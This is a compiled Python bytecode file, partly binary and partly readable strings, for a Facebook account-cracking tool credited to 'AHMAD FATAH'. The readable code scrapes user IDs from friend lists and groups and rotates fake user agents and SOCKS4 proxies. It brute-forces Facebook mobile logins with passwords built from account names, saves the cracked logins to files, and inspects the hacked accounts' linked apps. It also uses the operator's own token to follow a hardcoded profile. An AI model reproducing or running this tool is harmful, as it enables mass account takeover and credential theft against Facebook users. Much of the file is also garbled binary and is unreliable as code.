o
    oA�b'�  �                   @   sb  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dl
mZ d d	lm Z! d d
l"m#Z$ d dl
mZ% d dl
m&Z& d dl'm(Z) zd dl
Z
W n e*y�   eed�� e�+d� Y nw zd dl,Z,W n e*y�   eed�� e�+d� Y nw zd dl Z W n e*y�   eed�� e�+d� e�+d� Y nw e&�-�  e� Z.g Z/g Z0g Z1e �2� Z3g Z4ze �5d�j6Z7e8dd��9e7� W n e:�y Z; z
ed� W Y dZ;[;ndZ;[;ww e<d�D ]�Z=dZ>e�?dd�Z@e�?dd�ZAdZBe�?dd�Z;dZCe�?dd�ZDe�?dd �ZEe�?dd �ZFe�?dd �ZGd!ZHe>� e@� d"eA� d#eB� e;� eC� eD� d"eE� d"eF� d"eG� d#eH� �ZIe/�JeI� d$ZKe�Lg d%��Z@d&ZAe�Lg d'��ZBe�?dd(�Z;e�Lg d'��ZCd)ZDe�?d*d�ZEd+ZFe�?d,d-�ZGe�?d.d/�ZHd0ZMeK� d#e@� d1eA� eB� e;� eC� d2eD� eE� d"eF� d"eG� d"eH� d#eM� �ZNe0�JeN� �qe<d3�D ]`ZOd4Z>e�?dd�Z@e�?dd�ZAe�Lg d'��ZBe�Lg d'��Z;e�Lg d'��ZCe�Lg d'��ZDe�?dd�ZEd5ZFe�?dd�ZGe�?dd�ZHd6ZMe>� e@� d7eA� eB� e;� eC� eD� eE� eF� eG� d"eH� d#eM� �ZP�q�d8d9� ZIg g d d d g g g g g g g g f\ZQZRaSaTaUZVZWZXZYZZZ[Z\Z]g Z1g g Z^Z_d:Z`d;Zad<Zbd=Zcd>Zdd?Zed@ZfdAZgdBZhdCZidDZOd;ZjdEZHd<ZEdFZkdGZldHZmd@Z@dIZne�LejeHeEele@g�ZodJdKdLdMdNdOdPdQdRdSdTdUdV�ZpdJdKdLdMdNdOdPdQdRdSdTdWdX�Zqej�r� jsZtepeuej�r� jv� Zwej�r� jxZydYeuet� dZ euew� dZ euey� d[ Zzd\euet� dZ euew� dZ euey� d[ Z{d]d^� Z|d_d`� Z}dadb� Z~dcdd� Zdedf� Z�dgdh� Z�didj� Z�dkdl� Z�dmd^� Z|dndo� Z�e��  dpdq� Z�drds� Z�dtdu� Z�dvdw� Z�e@dx eE dy e@ dz Z�d{d|� Z�d}d~� Z�dd�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�e�d�k�r�ze�+d�� W n   Y ze��d�� W n   Y ze��d�� W n   Y ze��d�� W n   Y ze�+d�� W n   Y ze�+d� W n   Y ze�+db� W n   Y e��d�� e��  dS dS )��    N)�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�pretty)�Textu&   	• Sedang Menginstall Modul Rich •zpip install richu+   	• Sedang Menginstall Modul Stdiomask •zpip install stdiomasku*   	• Sedang Menginstall Modul Requests •z.pip install requests && pip install mechanize zpkg install play-audiozwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt�wu(   [[[1;92m•[1;97m] [[1;96mAHMAD FATAHi'  z!Mozilla/5.0 (Symbian/3; Series60/�   �	   ZNokia�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)�6�7�8�9�10�11�12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile Safari/537.36z; z) �
   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-B�/c                  C   s�   zt dd��� �� } | D ]}t�|� qW d S    t�d�j}t dd�} t�	dt
|��}|D ]	}| �|d � q/t dd��� �� } Y d S )Nz	bbnew.txt�rz0https://github.com/EC-1709/a/blob/main/bbnew.txtz
.bbnew.txtr   zline">(.*?)<�
)�open�read�
splitlines�ugen�append�requests�get�text�re�findall�str�write)�uaZub�a�aaZun� rL   �Ahmad.py�uakuZ   s   �
rN   z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34mZJanuaryZFebruaryZMarchZAprilZMayZJuneZJulyZAugustZ	SeptemberZOctoberZNovemberZDecember)�1�2�3�4�5r   r   r   r   r   r   r   ZDevember)�01�02�03Z04Z05Z06Z07Z08Z09r   r   r   zOK-�-z.txtzCP-c                 C   �2   | d D ]}t j�|� t j��  t�d� qd S �Nr<   g���Q��?��sys�stdoutrH   �flush�time�sleep)�z�erL   rL   rM   �jalan�   s
   
�rb   c                 C   rX   )Nr<   g�������?rZ   )�ura   rL   rL   rM   �	alvino_xy�   s   2rd   c                   C   s   t �d� d S )N�clear)�os�systemrL   rL   rL   rM   re   �   s   re   c                   C   s
   t �  d S )N)�loginrL   rL   rL   rM   �back�   s   
ri   c                   C   s   t dt� d�� d S )N�	u                                            
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                   ╭━━━┳╮╱╭┳━╮╭━┳━━━┳━━━╮         
                   ┃╭━╮┃┃╱┃┃┃╰╯┃┃╭━━┻╮╭╮┃         
                   ┃┃╱┃┃╰━╯┃╭╮╭╮┃╰━━╮┃┃┃┃             
                   ┃╭━╮┃┃╱┃┃┃┃┃┃┃╰━━┳╯╰╯┃         
                   ╰╯╱╰┻╯╱╰┻╯╰╯╰┻━━━┻━━━╯
               
                   Creator  : 𝗔𝗛𝗠𝗔𝗗 𝗙𝗔𝗧𝗔𝗛          
                   Github   : 𝗠𝗥_𝗔𝗛𝗠𝗔𝗗
                   Telegram : 𝗥𝗔𝗦𝗛𝗔_𝗛𝗔𝗖𝗞𝗘𝗥1                    
                   DOX      : BAXORAY                        
                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
)r   �asurL   rL   rL   rM   �banner�   s   rl   c                  C   s�   zgt dd��� } t dd��� }t�| � z&tjdtd  d|id�}t�|j�d }t�|j�d	 }t	||� W W d S  t
yH   t�  Y W d S  tjjyg   d
}t|dd�}t� j|dd� t�  Y W d S w  tyt   t�  Y d S w )N�
.token.txtr;   �.cok.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r   �cookie��cookies�name�idz2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN�red�ZstyleZcyan)r=   r>   �tokenkurA   rB   rC   �json�loadsrD   �menu�KeyError�login_lagi334�
exceptions�ConnectionError�mark�solr   �exit�IOError)�token�cokZsyZsy2Zsy3�li�lorL   rL   rM   rh   �   s(   
��rh   c                  C   sD  zvt �d� t�  ttd�� t�ttt	t
tg�} tdt	� dt� d| � d��}tjddd	d
ddddddd�	d|id�}t�d|j�}tdd��|�d��}t�  tdd��|�}tdt� dt	� dt� dt	� dt� d�� t�d� t�  W d S  ty� } zt �d� t �d� tdtttttf � t�  W Y d }~d S d }~ww ) Nre   u8   	©©© Saran Ektensi : [green]Cookiedough[white] ©©©z  [�   •z] inter Cookies :r   z0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comrO   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	�
user-agent�refererZhost�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-typero   )�headersrq   z	(EAAG\w+)rm   r   r   rn   �  �[�]z5 LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!zrm -f .token.txtzrm -f .cok.txtz6  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s)rf   rg   rl   �cetak�nel�random�choice�m�k�h�brc   �input�xrB   rC   rE   �searchrD   r=   rH   �group�botr   r^   r_   r�   �	Exception)rk   ro   �dataZ
find_tokenZkenr�   ra   rL   rL   rM   r{   �   s&   
(2

��r{   c                   C   s"   z
t �dt � W d S    Y d S )NzMhttps://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s)rB   �postrv   rL   rL   rL   rM   r�   �   s   r�   c                 C   rX   rY   rZ   )ZkelilingZmaurL   rL   rM   rb   �   s   �c                  C   s�   t t�� �t t�� � } d�| �}td| � z1t�d�j}||v r4td� t t�� �}t	�
d� W d S td� t�d� t	�
d� t��  W d S    t��  tdkr^tt� t�  Y d S Y d S )	NrW   z[37;1mYour ID : z:https://github.com/Mr-ahmad11/free-paid/blob/main/free.txtz[92mYOUR ID IS ACTIVE.........r   zY[93mBarezm Id kat active nya Tkaya bo Active krdn NAME bnera bo telegram @KURDSTANxTOOLSz'xdg-open https://t.me/HAMWSHTxBOFROSHTN�main)rG   rf   �geteuid�getlogin�joinr   rB   rC   rD   r^   r_   rg   r[   r�   rr   Zlogo�chk)Zuuidrs   ZhttpCaht�msgrL   rL   rM   r�   �   s(   



�r�   c                 C   s�   zt dd��� }t dd��� }W n ty%   td� t�d� t�  Y nw t�d� t	�  t
d� t
d� t
d	� t
d
� td�}|dv rKt�  d S |dv rTt�  d S |dv r]t�  d S |dv rtt�d� t�d� td� t�  d S td� t�  d S )Nrm   r;   rn   u   [×] Cookies Kadaluarsa �   re   u   ➤ 1. Crack ID PUBLIG u   ➤ 2. Crack Grup   u   ➤ 3. serkrdy hakrawakan  u   ➤ 0. darchwn       �   
➤ Pilih : �rO   �rP   �rQ   )r6   zrm -rf .token.txtzrm -rf .cookie.txtu   ➤ Sukses Logout+Hapus Kukis u   ➤ Pilih Yang Bener Asu )r=   r>   r�   r   r^   r_   r{   rf   rg   rl   rb   r�   �dump_massal�grup�resultr�   ri   )Zmy_nameZmy_idr�   r�   Z_____alvino__adijaya_____rL   rL   rM   ry   �   s8   

�







ry   c                   C   s"   t t� d�� t�d� t�  d S )Nu$   ➤ Anda Akan di arahkan ke Facebookr   )rb   r�   r^   r_   ri   rL   rL   rL   rM   �error  s   

r�   c               
   C   s�  t dt� dt� d�� t dt� dt� d�� t d� td�} | dv �r:zt�d�}W n ty?   t d	� t�	d
� t
�  Y nw t|�dkrTt d� t�	d� t
�  d S d}i }|D ]k}ztd| d��� }W n   Y qZ|d7 }|dk r�dt|� }|�t|�t|�i� |�|t|�i� t dt� dt� d�||t|�f � qZ|�t|�t|�i� t dt|� d | d tt|�� d t � qZtd�}z|| }W n ty�   t d� t
�  Y nw ztd| d��� �� }	W n   t d	� t�	d� t
�  Y d}
tt|	��D ]}|	|
 �d�}t dt� |d � d|d � �� |
d7 }
�qt d� tdt� dt� d�� t
�  d S | d v �r`zt�d�}W n t�y\   t d	� t�	d� t
�  Y nw t|�dk�rrt d!� t�	d� t
�  d S d}i }|D ]i}ztd"| d��� }W n   Y �qx|d7 }|dk �r�d#t|� }|�t|�t|�i� |�|t|�i� t d$t� d%t� d&�||t|�f � �qx|�t|�t|�i� t dt� dt� d�||t|�f � �qxtd'�}z|| }W n t�y�   t d� t
�  Y nw ztd"| d��� �� }	W n   t d	� t�	d� t
�  Y d}
tt|	��D ]'}|	|
 �d�}t d� t d(t� |d � d|d � d|d � �� |
d7 }
�q$t d� tdt� dt� d�� t
�  d S | d)v �rjt
�  d S t d� t
�  d S )*Nu   ➤ 1. awanay �OKr�   u   ➤ 2. awanay �CPu   ➤ 3. garanawa	r�   r�   u   ➤ File Tidak Di Temukan �   r   u!   ➤ Anda Tidak Memiliki Hasil CP �   �CP/r;   r   r9   � u   ➤ %s. %s (� %s zIdz )r�   �] z [ z
 Account ]�   ➤ Pilih Yang Bener Kontol �|u   ➤ �   ➤[z Klik Enterz ]r�   u!   ➤ Anda Tidak Mempunyai File OK �OK/r6   u   ➤%s. %s ( �%sz Idz )z	
Pilih : �   ➤r�   )r   r�   r�   r�   r�   rf   �listdir�FileNotFoundErrorr^   r_   ri   �lenr=   �	readlinesrG   �updaterz   r>   r?   �range�splitr�   )ZkzZvinZcihZlolZisiZhemZnomZgeehZgehZlinZnocpZcpkuZcpkunirL   rL   rM   r�     s�   


�


&2
�
 



�


((
�
*



r�   c               
   C   s  zt dd��� } t dd��� }W n ty   t�  Y nw zttd��}W n ty5   td� t�  Y nw |dk s>|dkrEtd� t�  t�	� }d	}t
|�D ]}|d7 }td
t|� d �}t�|� qOtD ]W}z9|jd| d td	  d|id��� }|d d D ]}	z|	d d |	d  }
|
tv r�nt�|
� W q�   Y q�W qg ttfy�   Y qg tjjy�   td� t�  Y qgw ztd� tdt� �ttt�� � t�  W d S  tjjy�   tt� � td� t�  Y d S  ttf�y   tdt� dt� �� t�d� t�  Y d S w )Nrm   r;   rn   u"   ➤ Lasar chand id crack dkay ? : u(   ➤ Masukkan Angka Anjing, Malah Huruff r   r   u   ➤ Gagal Dump Idz r   u   ➤ Idyaka dabne z : z https://graph.facebook.com/v2.0/z)?fields=friends.limit(5000)&access_token=rq   rp   Zfriendsr�   rs   r�   rr   u   ➤ Sinyal Loh Kek Kontoll r�   u   ➤ zhmaray idyakan u   ➤ Sinyal Lo kek Kontol r�   z Pertemanan Tidak Public r�   )r=   r>   r�   r�   �intr�   �
ValueErrorr   rB   �Sessionr�   rG   �uidrA   rC   rv   rw   rs   rz   r|   r}   r�   r�   �settingr�   ri   r�   r^   r_   )r�   r�   Zjum�sesZyzZmet�klZuserr�col�miZisorL   rL   rM   r�   s  sf   
�
�&

�
�
�

�r�   r�   u   ✓r�   c                   C   sB   t dt� d�tt� � tdt� dt� d�� t d� 	 t�  d S )Nu   ➤ Total ID Yang Terkumpul :r�   u   ➤ [ zKlik Enter r�   r�   )r   r�   r�   rs   r�   r�   r�   r�   rL   rL   rL   rM   �lah�  s
   
r�   c                  C   st  t d� td�} d}d|i}d|  }t�� }zt|j||d�jd�}W n tjjy:   t d� t	�
d	� t�  Y nw |�d
�}|j�dd��dd�}|dkr\t d� t	�
d	� t�  n|dkrmtd� t	�
d	� t�  n	 t dt� d�| � |�d�}g }	|D ]}
|
j}|�dd�}zt|�}|	�|�}W q�   Y q�t|	�dkr�t d� nt dt� d�|	d  � t|� d S )Nr�   u%   ➤ Masukkan Username Atau ID Grup : ��Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gbar�   z#https://mbasic.facebook.com/groups/�r�   �html.parseru   ➤ Sinyal Loo Kek Kontol g      �?�title� | Facebook� Grup Publik�Masuk Facebookz5 Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..Z	Kesalahanz>> Grup Tidak Di Temukan u   ➤ Nama Grup : r�   �tableZAnggotar   z Anggota : -u   ➤ Anggota : )r   r�   rB   r�   �parserrC   rD   r|   r}   r^   r_   r�   �find�replacer�   rd   r�   �find_allr�   rA   r�   r�   �grup1)rs   rI   �miskinlu�urlr�   ZgnZberrZberr2ZggsZangZffZanggoZbroZmexZjumlahrL   rL   rM   r�   �  sN   

�




r�   c                 C   s�  g }t �� }td� tdt� dt� dt� dt� d�	� 	 �z#d}d	|i}z|d
 }W n   | }Y t|j||d�jd�}|�	d�}|D ]$}t
|��d�}	d|	v rgt
|��dd��dd�}
|
�d�d
 �dd�}qC|�	d�}|D ]�}|j}|�d�}d|v r�t�dt
|��}|d
 �dd�}|�dd�}|d | }|tv r�qot�|� tdt t d t d t
tt�� t d dd� tj��  qod|v �rt�dt
|��}|d
 �dd�}|�d �d
 }|d | }|tv r�qot�|� t�ttttttg�}td!t� d"|� d#t� d$�tt� dd� tj��  qoqoz|}|�d
d%| � W n   |�d&�}|j�d'd��d(d�}|d)k�r;nt�  Y W n- t jj�ya   zt �!d*� W n t"�y^   t�  Y nw Y n t"�ym   t�  Y nw q)+Nu   ➤ Sedang Mengumpulkan ID u	   ➤ Klik zCtrl+Cz Untuk ZStopz Dump !!Tr�   r�   r   r�   r�   rJ   �>zLihat Postingan Lainnya</spanz	<a href="r�   zamp;r   z"><imgr�   Z
mengajukanzcontent_owner_id_new.\w+zcontent_owner_id_new.z mengajukan pertanyaan .r�   �z { zProses Mengambil ID z }��endz > u   🔥�(r�   u   )🔥�https://mbasic.facebook.comr�   r�   r�   r�   �   )#rB   r�   r   r�   r�   r�   r�   rC   rD   r�   rG   r�   r�   rE   rF   rs   rA   �balmondr�   r�   r[   r\   r]   r�   r�   rc   r�   �insertr�   r�   r|   r}   r^   r_   �KeyboardInterrupt)ZurlsZuser�   rI   r�   r�   �setZbf2�gZcssZbcjZbcj2ZtesZcariZliatnihZsplZidsiapaZidyouZnamayouZidkuZxyZlink_ZgirangZgirang2rL   rL   rM   r�   �  s�   "
�


@

4

�
��
��r�   c                  C   s�  t d� t d� t d� t d� td�} | dv r%tt�D ]}t�|� qn2| dv r8g }tt�D ]}|�|� q/n| dv rPtD ]}t�d	tt��}t�	||� q>nt d
� t
�  t d� t d� td�}|dv rmt�d� n|dv rut d� t d� td�}|dv r�t d� t�  n|dv r�t�d� nt�d� td�}|dv r�t�d� ttd�� td�}|�d�}	|	D ]}
t�|
� q�nt�d� t�  d S )Nu   ➤ 1. crack ba id kon u   ➤ 2. crack ba id Nwe u   ➤ 3. crack ba id Nwe kon r�   �   ➤ Pilih : )rO   rT   )rP   rU   )rQ   rV   r   u   ➤ Pilih Yang Bener Kontooll u   ➤ 1. Mobile �mobile)r�   r�   u&   ➤ ATAWE BARNAMAKAN PSHANDAT ( Y/t ) ��yr3   �ya�nou(   ➤ ATAWE PASWORDY XOT ZYADKAYT ( Y/t ) u   [[cyan]•[white]ba pasakan la shash dana zyatr nabe 
[[cyan]•[white]] nmwna :[green] 1234554321,123456789,1122334455[white] u   ➤ paswordakan lera bnwsa : �,)r   r�   �sortedrs   �id2rA   r�   Zrandintr�   r�   r�   �methodri   �	taplikasi�pwplussr�   r�   r�   �pwnya�passwrd)�huZtuaZmudaZbacotZxxZhcZ_jembot_ZpwplusZpwkuZpwkuhZxpwrL   rL   rM   r�     s^   ���


�

r�   c               
   C   s�  t dt� dt� dt� dt� �t � t dt� dt� dt� dt� �t � t dt� d	t� d
�� tdd���<} tD �]0}|�	d�d |�	d�d �
� }}|�	d�d }g }t|�dk r�t|�dk rbn�|�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � net|�dk r�|�|� nY|�|� |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � |�|d � dtv �r-tD ]}|�|� �q#n	 d tv �r;| �t||� q8d!tv �rH| �t||� q8d"tv �rU| �t||� q8d#tv �rb| �t||� q8| �t||� q8W d   � n	1 �suw   Y  td$� ttd%�� td&t� d't� d(t� d)�t � td&t� d't� d*t� d+t� d�	t � td$� td,� td-�}|d.v �r�t�  d S td/t� d0�� t�d1� t�  d S )2Nu   ➤ awanay r�   z saiv dabn la  : zOK/%s r�   z saiv dabn la : zCP/%s u(   ➤ mode tayaraka leda dway crack krdny Z1kz Idz
�   )Zmax_workersr�   r   r   r   �   r�   Z123Z1234Z12345Z123456Z1234567Z12345678Z	123456789Z1122Z112233Z1212Z2022Z4321r�   r�   �freeZtouchZmbasicr�   uM   	[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] r�   u   •➤]z OK : z%s z CP : r�   u#   ➤ Lanjut Crack Kembali ( Y/t ) ? r�   r�   u   	➤z Good Bye BRA r�   ) rb   r�   r�   �okcr�   �cpcr�   �tredr�   r�   �lowerr�   rA   r�   r�   r�   �submit�crackZ	crackfreeZ
cracktouchZcrackmbasicr   r�   r�   r�   �ok�cpr�   ri   r^   r_   r�   )ZpoolZyuzong�idfZnmfZfrs�pwvZxpwdZwoirL   rL   rM   r�   J  s�   $$
"

�



��4 &



r�   c                 C   s�  t �ttttttg�}tj	�
dt� t� t� t� dt� tt�� t� dt� t� t� t� dt� t� t� t� d|� d�tttt�� �� t� d��f tj	��  t �t�}t �t�}t�� }|D �]
}�z�t �t�}dd	| i}|j�d
ddd|dddddd�
� |�d|  d �}	t�dt|	j ���!d�t�dt|	j ���!d�| dd|d�}
d�"dd� |	j#�$� �%� D ��}|d7 }i d d
�d!d�d"d#�d$d�d%d&�d'd�d(d)�d*d+�d,|�d-d�d.d/�d0d�d1d�d2d�d3d|  d �d4d5�d6d�}|j&d7|
d8|i|d9|d:�}d;|j#�$� �'� v �r7t(d<tt)||t*f � t+d=t, d>��
| d? | d@ � t-�.dA� t/�0| d? | � td7 aW  �n1dB|j#�$� �'� v �rSd,dCi}dDt1v �r�td7 a|j#�$� }d�"dEd� |j#�$� �%� D ��}t(d<tt)||t*f � t+dFt2 d>��
| d? | d? | d@ � t-�.dG� W  n�dHt1v �rR|j#�$� }d�"dId� |j#�$� �%� D ��}t+dFt2 d>��
| d? | d? | d@ � | }dJ}t�� }|jdK||dL�j }|jdM||dL�j }t�3dNt|��}d}|D ]#}|t� dOt� |� t� dPt� |dQ � dR|d � t� d@�7 }|d7 }�q�dQ}t�3dNt|��}dQ}|D ]#}|d7 }|t� dOt� |� t� dPt� |dQ � dR|d � t� d@�7 }�qt(dSt� | � d?|� d?|� d@|� t� �
� t-�.dG� td7 aW  nnW q\W q\ tj4j5�yg   t6�7d� Y q\w td7 ad S )TNzAHMAD r�   z [OK] z [CP] z [z{:.0%}z]  Zhttpz	socks4://zm.facebook.comr�   �?1rO   z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�same-originZcors�emptyr�   )
�Hostr�   �sec-ch-ua-mobiler�   r�   r�   �sec-fetch-site�sec-fetch-mode�sec-fetch-destr�   z8https://m.facebook.com/login/device-based/password/?uid=ah  &flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdrzname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"a"  https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecifiedZlogin_no_pin)Zlsd�jazoestr�   �nextZflow�pass�;c                 S   �   g | ]
\}}d ||f �qS �z%s=%srL   ��.0�key�valuerL   rL   rM   �
<listcomp>�  �    zcrack.<locals>.<listcomp>z  m_pixel_ratio=2.625; wd=412x756r  r�   z	sec-ch-uaz(" Not A;Brand";v="99", "Chromium";v="98"r  zsec-ch-ua-platformz	"Android"r�   r�   zhttps://m.facebook.comr�   �!application/x-www-form-urlencodedr�   r�   �x-requested-withZXMLHttpRequestr  r  r  r�   �accept-encodingzgzip, deflate, brr�   zQhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDro   F)r�   rq   r�   �allow_redirectsZproxies�
checkpointuN   %sOK %s               
└─── Username : %s
  └── Password : %s%sr�   rJ   r�   r<   zplay-audio cp.mp3�c_user�`Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)AppleTV6,2/11.1AppleTV5,3/9.1.1r�   c                 S   r  r  rL   r  rL   rL   rM   r  �  r  r�   zplay-audio ok.mp3r�   c                 S   r  r  rL   r  rL   rL   rM   r  �  r  r�   �>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive)rq   r�   �<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activez`</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>r�   r�   r   r   u
   ➤ Live )8r�   r�   r�   r�   r�   r�   rc   r�   r[   r\   rH   r*   �loopr�   rs   r"   r  r  �format�floatr]   r@   �ugen2rB   r�   �proxr�   r�   rC   rE   r�   rG   rD   r�   r�   rq   �get_dict�itemsr�   �keysr   Zwaktur(   r=   r  rf   rg   �akunrA   r�   r   rF   r|   r}   r^   r_   )r  r	  ZborI   Zua2r�   �pwZnipZproxs�pZdataaZkokiZheadeZpo�userZheadappZcokiZkukiZinfoakun�sessionZcek2�cekZapkaktifZnokZmunculZhitZapkexprL   rL   rM   r  �  s�   x




":r 


(


(8<(
���r  c                 C   s�  d}ddddd|ddd	d
dddddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}t	d't|jtf � q�W d S  ty� } z-t	dt
| |tf � t	d(ttf � tdt d ��| d! | d" � td#7 aW Y d }~d S d }~ww ))Nr$  �mbasic.facebook.comr�   rO   r�   r  �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gpr  �navigater
  �document�:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflater�   �r  r�   r�   r�   r�   r�   r�   r  r  r  zsec-fetch-userr  r�   r   r�   �%https://mbasic.facebook.com/login.phpr  �Zemailr  rh   T�r�   r�   r!  r�   �form�Znhr  Zfb_dtsgzsubmit[Continue]Zcheckpoint_datar�   rr   r  �action�r�   r�   �   %sAHMAD %s|%s ➤ CP       %sr�   rJ   r�   r<   r   �optionr   u1   %s➤ Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)�   %s➤ %s%su=   %s➤ Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)rB   r�   rC   �sopr�   rD   r�   r�   rG   r   r�   r�   r=   r  rH   r  r�   r�   �hh�kkr�   rc   )r  r0  rI   �headr�   �hi�ho�jor�   �lion�anj�kent�opsi�opsii�crL   rL   rM   �ceker�  s<   $
"
�$ 
� ��rT  c                  C   s$  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]Q}�z/z|�
d�d
 |�
d�d }}W n  tyd   t�d� tdt|tf � tdttf � Y W q.w t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j�� � � v �r=zi|�!d*�}i }g d+�}|d,�D ]}|�d-�|v r�|�"|�d-�|�d.�i� q�t|	jdt#|d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�rtd3ttf � n|D ]}td4t|jtf � �qW n6   td1t||tf � td5ttf � Y nd6|	j�� � � v �rRtd7t||tf � n
td8t||tf � |d7 }W q. tj%j&�y�   td9� d:}t� �t	|d;d	�� t'�  Y q.w d<}t� �t	|dd	�� t'�  d S )=NzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSI)r�   r�   r�   z] Mulaiz# PROSES CEK OPSI DIMULAIZgreenru   r   r�   r   r�   u   %sAHMAD %s ➤ Error      %su1   %s➤ Pemisah Tidak Didukung Untuk Program Ini%su   %s➤ %s/%s ➤ { %s }%sr   r�   z{Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36r5  r�   rO   r�   r  r6  r7  r  r8  r
